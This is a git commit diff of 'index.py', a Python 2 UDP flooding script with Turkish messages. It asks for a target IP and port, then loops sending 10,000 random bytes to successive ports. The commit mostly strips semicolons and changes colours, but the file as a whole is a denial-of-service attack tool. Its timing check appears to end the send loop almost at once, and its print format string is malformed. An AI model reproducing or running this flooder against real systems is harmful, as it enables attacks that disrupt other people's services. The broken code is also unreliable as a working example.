8ae4614e9ecabe26349ec53ccbaa18e9e9795fff
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 18:17:47 +0300

    Update index.py

--- index.py
+++ index.py
@@ -12,7 +12,7 @@ month = now.month
 year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(10000)
-timeout =  time.time()
+timeout = time.time()
 
 print ("""
 \033[1;36;40m
@@ -23,40 +23,40 @@ print ("""
 | |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
-""");
-ip = raw_input("\033[1;33;40mIP: ");
-port = input("\033[1;33;40mPort: ");
-os.system("clear");
-print "\033[91mBaslatiliyor...";
-print "\033[91m[                    ] %0";
+""")
+ip = raw_input("\033[1;33;40mIP: ")
+port = input("\033[1;33;40mPort: ")
+os.system("clear")
+print "\033[92mBaslatiliyor..."
+print "\033[92m[                    ] %0"
 time.sleep(1);
-os.system("clear");
-print "\033[91mBaslatiliyor...";
-print "\033[92m[#####               ] %25";
-time.sleep(2);
-os.system("clear");
-print "\033[91mBaslatiliyor...";
-print "\033[92m[##########          ] %50";
-time.sleep(3);
-os.system("clear");
-print "\033[91mBaslatiliyor...";
-print "\033[92m[###############     ] %75";
-time.sleep(4);
-os.system("clear");
-print "\033[91mBaslatiliyor...";
-print "\033[92m[####################] %100";
-time.sleep(5);
-os.system("clear");
-sent = 0;
+os.system("clear")
+print "\033[92mBaslatiliyor...";
+print "\033[92m[#####               ] %25"
+time.sleep(2)
+os.system("clear")
+print "\033[92mBaslatiliyor..."
+print "\033[92m[##########          ] %50"
+time.sleep(3)
+os.system("clear")
+print "\033[92mBaslatiliyor..."
+print "\033[92m[###############     ] %75"
+time.sleep(4)
+os.system("clear")
+print "\033[92mBaslatiliyor..."
+print "\033[92m[####################] %100"
+time.sleep(5)
+os.system("clear")
+sent = 0
 while True:
      while 1:
        if time.time() > timeout:
-         break;
+         break
        else:
-         pass;
-         sock.sendto(bytes, (ip, port));
-         sent = sent + 1;
-         port = port + 1;
-         print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port);
+         pass
+         sock.sendto(bytes, (ip, port))
+         sent = sent + 1
+         port = port + 1
+         print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port)
          if port == 65534:
-           port = 1;
+           port = 1
